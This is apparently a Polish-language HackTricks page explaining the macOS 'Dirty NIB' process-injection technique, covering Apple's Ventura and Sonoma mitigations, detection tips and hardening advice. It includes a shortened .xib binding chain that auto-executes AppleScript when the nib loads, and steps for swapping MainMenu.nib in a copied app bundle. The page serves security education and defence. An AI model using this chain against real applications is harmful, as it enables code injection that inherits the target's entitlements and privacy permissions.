# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB odnosi się do nadużywania plików Interface Builder (.xib/.nib) znajdujących się wewnątrz podpisanego bundle aplikacji macOS w celu wykonania logiki kontrolowanej przez atakującego w procesie docelowym, a tym samym odziedziczenia jego entitlements i uprawnień TCC. Technika ta została pierwotnie opisana przez xpn (MDSec), a następnie uogólniona i znacznie rozszerzona przez Sector7, który omówił również mechanizmy mitigacji firmy Apple w macOS 13 Ventura i macOS 14 Sonoma.<sup>[1][2]</sup> Informacje ogólne i pogłębione analizy znajdują się w odnośnikach na końcu.

> TL;DR
> • Przed macOS 13 Ventura: zastąpienie MainMenu.nib bundle (lub innego nib ładowanego podczas uruchamiania) mogło niezawodnie umożliwić process injection i często privilege escalation.
> • Od macOS 13 (Ventura), a także po usprawnieniach w macOS 14 (Sonoma): weryfikacja podczas pierwszego uruchomienia, ochrona bundle, Launch Constraints i nowe uprawnienie TCC „App Management” w dużej mierze uniemożliwiają modyfikowanie nib po uruchomieniu przez niepowiązane aplikacje. Ataki mogą nadal być możliwe w niszowych przypadkach, np. gdy narzędzia tego samego developera modyfikują własne aplikacje albo terminale otrzymały od użytkownika App Management/Full Disk Access.


## Czym są pliki NIB/XIB

Pliki Nib (skrót od NeXT Interface Builder) to serializowane grafy obiektów UI używane przez aplikacje AppKit. Współczesny Xcode przechowuje edytowalne pliki XML .xib, które podczas procesu build są kompilowane do formatu .nib. Typowa aplikacja ładuje swój główny interfejs UI za pomocą `NSApplicationMain()`, który odczytuje klucz `NSMainNibFile` z pliku Info.plist aplikacji i tworzy instancje grafu obiektów w czasie działania.

Kluczowe punkty umożliwiające atak:
- Ładowanie NIB tworzy instancje dowolnych klas Objective-C bez wymogu zgodności z NSSecureCoding (loader nib firmy Apple korzysta z `init`/`initWithFrame:`, gdy `initWithCoder:` nie jest dostępne).
- Cocoa Bindings mogą zostać wykorzystane do wywoływania metod podczas tworzenia instancji nib, w tym wywołań łańcuchowych, które nie wymagają interakcji użytkownika.


## Proces Dirty NIB injection (z perspektywy atakującego)

Klasyczny przebieg sprzed Ventura:
1) Utwórz złośliwy plik .xib
- Dodaj obiekt `NSAppleScript` (lub inne klasy typu „gadget”, takie jak `NSTask`).
- Dodaj `NSTextField`, którego title zawiera payload, np. AppleScript lub argumenty polecenia.
- Dodaj co najmniej jeden obiekt `NSMenuItem` połączony za pomocą bindings w celu wywołania metod na obiekcie docelowym.

2) Automatyczne wyzwolenie bez kliknięć użytkownika
- Użyj bindings do ustawienia target/selector elementu menu, a następnie wywołaj prywatną metodę `_corePerformAction`, aby akcja została automatycznie wykonana podczas ładowania nib. Eliminuje to potrzebę klikania przycisku przez użytkownika.

Minimalny przykład łańcucha automatycznego wyzwalania wewnątrz pliku .xib (skrócony dla przejrzystości):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
To umożliwia wykonanie dowolnego AppleScript w procesie docelowym podczas ładowania nib.<sup>[1]</sup> Zaawansowane łańcuchy mogą:
- Tworzyć dowolne klasy AppKit (np. `NSTask`) i wywoływać metody bez argumentów, takie jak `-launch`.
- Wywoływać dowolne selektory z argumentami będącymi obiektami za pomocą powyższej sztuczki z bindingiem.
- Ładować AppleScriptObjC.framework w celu połączenia z Objective-C, a nawet wywoływania wybranych API C.
- W starszych systemach, które nadal zawierają Python.framework, łączyć się z Pythonem, a następnie używać `ctypes` do wywoływania dowolnych funkcji C (badania Sector7).<sup>[2]</sup>

3) Zastąp nib aplikacji
- Skopiuj target.app do lokalizacji z możliwością zapisu, zastąp np. `Contents/Resources/MainMenu.nib` złośliwym nib i uruchom target.app. Przed Venturą, po jednorazowej ocenie Gatekeeper, kolejne uruchomienia wykonywały jedynie pobieżne sprawdzanie podpisu, więc zasoby niebędące plikami wykonywalnymi (takie jak .nib) nie były ponownie weryfikowane.

Przykładowy payload AppleScript do widocznego testu:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Nowoczesne zabezpieczenia macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple wprowadziło kilka systemowych mechanizmów ograniczających, które znacząco zmniejszają przydatność Dirty NIB w nowoczesnym macOS:<sup>[2]</sup>
- Szczegółowa weryfikacja przy pierwszym uruchomieniu i ochrona bundle (macOS 13 Ventura)
- Przy pierwszym uruchomieniu dowolnej aplikacji (objętej kwarantanną lub nie) szczegółowa weryfikacja sygnatury obejmuje wszystkie zasoby bundle. Następnie bundle zostaje objęty ochroną: tylko aplikacje od tego samego developera (lub aplikacje wyraźnie dozwolone przez daną aplikację) mogą modyfikować jego zawartość. Inne aplikacje wymagają nowego uprawnienia TCC „App Management”, aby zapisywać w bundle innej aplikacji.
- Launch Constraints (macOS 13 Ventura)
- Aplikacji systemowych/aplikacji dołączonych przez Apple nie można kopiować w inne miejsce i uruchamiać; eliminuje to podejście „skopiuj do /tmp, zmodyfikuj, uruchom” stosowane wobec aplikacji systemowych.
- Usprawnienia w macOS 14 Sonoma
- Apple zaostrzyło App Management i naprawiło znane obejścia (np. CVE‑2023‑40450) wskazane przez Sector7. Python.framework usunięto wcześniej (macOS 12.3), co przerwało niektóre łańcuchy privilege-escalation.
- Zmiany w Gatekeeper/Quarantine
- Szersze omówienie zmian w Gatekeeper, pochodzeniu plików i procesie oceny, które wpłynęły na tę technikę, znajduje się na stronie wskazanej poniżej.

> Praktyczne znaczenie
> • W Ventura+ zasadniczo nie można modyfikować pliku .nib aplikacji innej firmy, chyba że proces ma uprawnienie App Management lub jest podpisany tym samym Team ID co aplikacja docelowa (np. narzędzia developerskie).
> • Przyznanie powłokom/terminalom uprawnienia App Management lub Full Disk Access skutecznie ponownie otwiera tę powierzchnię ataku dla wszystkiego, co może wykonywać kod w kontekście tego terminala.


### Rozwiązywanie problemu Launch Constraints

Launch Constraints blokuje uruchamianie wielu aplikacji Apple z lokalizacji innych niż domyślne, począwszy od Ventura. Jeśli korzystasz z procesów sprzed Ventura, takich jak skopiowanie aplikacji Apple do katalogu tymczasowego, zmodyfikowanie `MainMenu.nib` i jej uruchomienie, oczekuj, że zakończy się to niepowodzeniem w wersji >= 13.0.


## Enumerating targets and nibs (useful for research / legacy systems)

- Zlokalizuj aplikacje, których interfejs użytkownika jest oparty na nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Znajdź potencjalne zasoby nib wewnątrz bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Dokładnie weryfikuj podpisy kodu (weryfikacja zakończy się niepowodzeniem, jeśli zmodyfikowano zasoby i nie wykonano ponownego podpisania):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Uwaga: W nowoczesnym macOS podczas próby zapisu do bundle innej aplikacji bez odpowiedniej autoryzacji blokadę stanowią również bundle protection/TCC.


## Wskazówki dotyczące wykrywania i DFIR

- Monitorowanie integralności plików zasobów bundle
- Obserwuj zmiany mtime/ctime w `Contents/Resources/*.nib` oraz innych niebędących plikami wykonywalnymi zasobach zainstalowanych aplikacji.
- Unified logs i zachowanie procesów
- Monitoruj nieoczekiwane wykonywanie AppleScript wewnątrz aplikacji GUI oraz procesy ładujące AppleScriptObjC lub Python.framework. Przykład:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Oceny proaktywne
- Okresowo uruchamiaj `codesign --verify --deep` dla kluczowych aplikacji, aby upewnić się, że zasoby pozostają nienaruszone.
- Kontekst uprawnień
- Audytuj, kto/co ma TCC „App Management” lub Full Disk Access (zwłaszcza terminale i agenty zarządzające). Usunięcie tych uprawnień z powłok ogólnego przeznaczenia zapobiega trywialnemu ponownemu włączaniu manipulacji w stylu Dirty NIB.


## Wzmacnianie zabezpieczeń (deweloperzy i obrońcy)

- Preferuj programistyczny interfejs UI albo ogranicz to, co jest instancjonowane z nibów. Unikaj dołączania potężnych klas (np. `NSTask`) do grafów nibów oraz bindingów, które pośrednio wywołują selektory na dowolnych obiektach.
- Stosuj hardened runtime z Library Validation (jest to już standard w nowoczesnych aplikacjach). Chociaż samo w sobie nie powstrzymuje to nib injection, blokuje łatwe ładowanie native code i zmusza atakujących do korzystania z payloadów opartych wyłącznie na skryptach.
- Nie żądaj ani nie opieraj działania narzędzi ogólnego przeznaczenia na szerokich uprawnieniach App Management. Jeśli MDM wymaga App Management, odseparuj ten kontekst od powłok sterowanych przez użytkownika.
- Regularnie weryfikuj integralność bundle swojej aplikacji, a mechanizmy aktualizacji projektuj tak, aby samoczynnie naprawiały zasoby bundle.


## Powiązane materiały w HackTricks

Dowiedz się więcej o Gatekeeper, kwarantannie i zmianach provenance wpływających na tę technikę:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Referencje

- [1] [xpn – DirtyNIB (oryginalny write-up z przykładem dotyczącym Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5 kwietnia 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
